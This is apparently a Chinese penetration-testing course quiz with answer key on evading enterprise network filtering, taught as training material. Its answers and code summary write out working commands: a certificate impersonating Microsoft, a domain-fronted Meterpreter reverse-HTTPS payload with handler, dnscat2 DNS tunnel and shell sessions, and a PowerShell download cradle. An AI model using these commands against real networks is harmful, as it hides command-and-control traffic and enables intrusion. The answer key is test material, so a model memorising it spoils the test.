# Module 10: 网络过滤绕过 - 综合测试

## 章节总结

本章学习了企业网络边界防御的各种技术以及相应的绕过方法：

1. **网络过滤概述** - 了解 DNS 过滤、Web 代理、IDS/IPS、HTTPS 检查等防御层
2. **DNS 过滤绕过** - 域名信誉管理、分类绕过、代理感知

## 三、简答题 (每题 10 分，共 30 分)

### 1. 请描述域前置技术的工作原理，并说明为什么它可以绕过网络过滤。

**参考答案要点**：
- TLS 和 HTTP 层独立处理
- SNI 字段指定一个允许的域名
- Host 头指定真实的 C2 域名
- CDN 根据 Host 头路由请求
- 观察者只能看到 SNI 中的域名
- 如果没有 HTTPS 检查，无法看到 Host 头

### 2. 比较 DNS 隧道和域前置技术的优缺点。

**参考答案要点**：

| 特性 | DNS 隧道 | 域前置 |
|------|----------|--------|
| 速度 | 慢 | 快 |
| 隐蔽性 | 中等 | 高 |
| 配置复杂度 | 中等 | 高 |
| 依赖 | DNS 服务器 | CDN |
| 检测难度 | 可通过流量分析检测 | 需要 HTTPS 检查 |

### 3. 如何准备一个用于渗透测试的 C2 域名？请列出关键步骤。

**参考答案要点**：
1. 提前注册域名（至少 2 周前）
2. 搭建看起来合法的网站
3. 提交到分类服务进行分类
4. 检查域名信誉（VirusTotal、IPVoid）
5. 检查 IP 地址信誉
6. 确保域名分类为允许的类别
7. 生成流量使域名看起来活跃

## 四、实践题 (共 20 分)

### 1. 生成自定义 SSL 证书 (10 分)

使用 OpenSSL 生成一个伪装成 Microsoft 的自签名证书，并说明如何在 Metasploit 中使用。

**参考答案**：

```bash
# 生成证书
openssl req -new -x509 -nodes -out cert.crt -keyout priv.key

# 填写信息
Country Name: US
State: Washington
Locality: Redmond
Organization: Microsoft Corporation
Common Name: www.microsoft.com
Email: admin@microsoft.com

# 合并证书
cat priv.key cert.crt > microsoft.pem

# 在 Metasploit 中使用
msf6> set HandlerSSLCert /path/to/microsoft.pem
msf6> set StagerVerifySSLCert true
msf6> exploit
```

### 2. 配置域前置 Payload (10 分)

编写 msfvenom 命令生成一个使用域前置的 Meterpreter payload，并配置相应的监听器。

**参考答案**：

```bash
# 生成 Payload
msfvenom -p windows/x64/meterpreter/reverse_https \
    LHOST=do.skype.com \
    LPORT=443 \
    HttpHostHeader=your-endpoint.azureedge.net \
    -f exe -o df-payload.exe

# 配置监听器
msf6> use exploit/multi/handler
msf6> set payload windows/x64/meterpreter/reverse_https
msf6> set LHOST do.skype.com
msf6> set LPORT 443
msf6> set OverrideLHOST do.skype.com
msf6> set OverrideRequestHost true
msf6> set HttpHostHeader your-endpoint.azureedge.net
msf6> run -j
```

## 六、核心代码汇总

### 6.1 检查代理设置

```powershell
# 检查系统代理
[System.Net.WebRequest]::DefaultWebProxy.GetProxy("http://example.com")

# 代理感知下载
$wc = New-Object System.Net.WebClient
$wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy
$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
$wc.DownloadString("http://example.com/script.ps1")
```

### 6.2 生成自定义证书

```bash
# 生成证书
openssl req -new -x509 -nodes -out cert.crt -keyout priv.key

# 合并证书
cat priv.key cert.crt > custom.pem

# Metasploit 配置
set HandlerSSLCert /path/to/custom.pem
```

### 6.3 域前置 Payload

```bash
# 生成 Payload
msfvenom -p windows/x64/meterpreter/reverse_https \
    LHOST=frontable-domain.com \
    LPORT=443 \
    HttpHostHeader=your-cdn.azureedge.net \
    -f exe -o payload.exe

# 监听器配置
set OverrideLHOST frontable-domain.com
set OverrideRequestHost true
set HttpHostHeader your-cdn.azureedge.net
```

### 6.4 DNS 隧道

```bash
# 服务端
dnscat2-server tunnel.com

# 客户端
dnscat2-v0.07-client-win32.exe tunnel.com

# 获取 Shell
session -i 1
shell
session -i 2

# TCP 隧道
listen 127.0.0.1:3389 target:3389
```

## 七、学习建议

1. **理解原理**：不要只记命令，要理解每种技术的工作原理
2. **动手实践**：在实验环境中实际操作每种技术
3. **流量分析**：使用 Wireshark 分析流量，理解检测方法
4. **组合使用**：实际渗透中可能需要组合多种技术
5. **持续更新**：网络防御技术不断更新，需要持续学习
